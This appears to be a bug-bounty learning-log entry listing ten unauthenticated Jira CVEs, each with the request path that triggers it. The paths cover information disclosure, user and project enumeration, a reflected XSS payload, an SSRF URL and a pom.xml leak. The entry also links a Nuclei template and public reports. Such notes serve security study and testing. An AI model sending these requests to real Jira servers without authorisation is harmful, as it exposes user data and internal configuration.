`21 December 2022`
## **Day 4: What I have Learned**
***
## **JIRA**:
- Jira is a proprietary issue tracking product developed by Atlassian that allows bug tracking and agile project management.
***
## **Unauthenticated & Exploitable JIRA Vulnerabilities**:
1. CVE-2020-14179 (Sensitive Information Disclosure)
- Navigate to <JIRA_URL>/secure/QueryComponent!Default.jspa.
- It leaks information about custom fields, custom SLA, etc.
2. CVE-2020-14181 (User Enumeration)
- Navigate to <JIRA_URL>/secure/ViewUserHover.jspa?username='<'uname'>'
3. CVE-2020-14178 (Project Key Enumeration)
-  Navigate to <JIRA_URL>/browse.<project_key>
- Observe the error message on valid vs. invalid project key. Apart from the Enumeration, you can often get unauthenticated access to the project if the protections are not in place.
4. CVE-2019-3402 (XSS) 
- Navigate to <JIRA_URL>/secure/ConfigurePortalPages!default.jspa?view=search&searchOwnerUserName=%3Cscript%3Ealert(1)%3C/script%3E&Search=Search
5. CVE-2019-11581 (SSTI)
- Navigate to <JIRA_URL>/secure/ContactAdministrators!default.jspa
6. CVE-2019-3396 (Path Traversal)
7. CVE-2019-8451 (SSRF)
- Navigate to <JIRA_URL>/plugins/servlet/gadgets/makeRequest?url=https://<host_name>:1337@example.com
8. CVE-2019-8449 (User Information Disclosure)
- Navigate to <JIRA_URL>/rest/api/latest/groupuserpicker?query=1&maxResults=50000&showAvatar=true.
- Observe that the user related information will be available.
9. CVE-2019-3403 (User Enumeration)
- Navigate to <Jira_URL>/rest/api/2/user/picker?query=<user_name_here> 
- Observe the difference in response when valid vs. invalid user is queried.
10. CVE-2019-8442 (Sensitive Information Disclosure)
- Navigate to <JIRA_URL>/s/thiscanbeanythingyouwant/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml
- Observe that the pom.xml file is accessible.
***
## **Tools**:
1. [Nuclei Template](https://github.com/projectdiscovery/nuclei-templates/blob/master/workflows/jira-workflow.yaml) can be used to automate most of these CVEs Detection.
## **Reports**:
1. [Information disclosure on sim.starbucks.com](https://hackerone.com/reports/632808).
2. [CVE-2020-14179 jspa leads to information disclosure](https://hackerone.com/reports/1003980).
## **Blog**:
1. [How i converted SSRF TO XSS in jira](https://medium.com/@D0rkerDevil/how-i-convert-ssrf-to-xss-in-a-ssrf-vulnerable-jira-e9f37ad5b158).

***
- A Map Of  Unauthenticated & Exploitable JIRA Vulnerabilities
[Here.](https://xmind.app/m/Jrn7f8/).
***
## **The End**